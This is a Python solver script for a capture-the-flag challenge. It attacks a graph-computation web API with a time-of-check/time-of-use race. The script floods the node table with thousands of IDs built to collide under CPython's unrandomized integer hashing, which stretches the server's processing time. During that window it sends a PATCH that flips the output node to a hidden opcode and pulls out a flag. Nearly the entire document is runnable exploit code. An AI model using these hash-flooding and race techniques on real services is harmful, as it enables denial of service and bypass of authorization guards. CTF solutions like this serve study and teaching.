#!/usr/bin/env python3
"""Solver for compuuuter (TOCTOU race + hash flooding).

`compute` does:
    guard(nodes)            # TIME OF CHECK -- "no node has type 1337"
    build node table        # slow, and fully attacker-controlled in length
    evaluate(nodes)         # TIME OF USE  -- reads each node's fields live

The node table is just a Python dict keyed by node id. Integer hashes are not
randomized: on 64-bit CPython, hash(n) == n % (2**61 - 1), so every id of the
form `BASE + k*(2**61-1)` shares the same hash and collides into a *single*
probe chain even in a dict. Thousands of them turn build/eval into O(n^2) --
that is our stopwatch: it stretches the gap between the guard and the
evaluation into seconds.

Into that gap we PATCH the output node, changing its type to 1337 (the hidden
flag opcode). `patch` does no guard, so the edit lands; by the time `evaluate`
reaches the output node it reads `type == 1337` and hands us the flag.

    usage: python3 solve.py [BASE_URL] [N]
"""

import json
import sys
import threading
import time
import urllib.request

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:3000"
N = int(sys.argv[2]) if len(sys.argv) > 2 else 15000  # flood size ~ window length

MODULUS = 2 ** 61 - 1
T_FLAG = 1337    # the hidden flag opcode
FLOOD_BASE = 7   # any id; all FLOOD_BASE + k*MODULUS share one hash

T_CONST = 1
OUT_ID = 1  # our output node


def call(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(
        BASE + path, data=data, method=method,
        headers={"Content-Type": "application/json"},
    )
    try:
        resp = urllib.request.urlopen(req)
        return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read())


def build_graph():
    # Many same-hash filler nodes (the stopwatch) + a benign output node, last.
    nodes = [{"id": FLOOD_BASE + k * MODULUS, "type": T_CONST, "args": [], "value": 0}
             for k in range(N)]
    nodes.append({"id": OUT_ID, "type": T_CONST, "args": [], "value": 0})
    return {"nodes": nodes}


def decode(value_str):
    v = int(value_str)
    if v <= 0:
        return None
    return v.to_bytes((v.bit_length() + 7) // 8, "little")


def attempt():
    status, data = call("POST", "/api/graph", build_graph())
    assert status == 200, data
    gid = data["id"]

    result = {}

    def do_compute():
        result["status"], result["data"] = call("POST", f"/api/graph/{gid}/compute")

    t = threading.Thread(target=do_compute)
    t.start()

    # Let the guard pass and the slow table build get under way, then flip the
    # output node's type to the hidden flag opcode.
    time.sleep(0.3)
    call("PATCH", f"/api/graph/{gid}",
         {"id": OUT_ID, "type": T_FLAG, "args": []})

    t.join()
    if result.get("status") != 200:
        return None
    out = result["data"]["results"].get(str(OUT_ID))
    flag = decode(out)
    if flag and b"{" in flag:
        return flag.decode(errors="replace")
    return None


def main():
    assert hash(FLOOD_BASE + MODULUS) == hash(FLOOD_BASE), "run me on 64-bit CPython"
    for i in range(1, 41):
        print(f"[*] attempt {i} (flood N={N}) ...", file=sys.stderr)
        flag = attempt()
        if flag:
            print(flag)
            return
    print("[-] lost the race, try a larger N", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
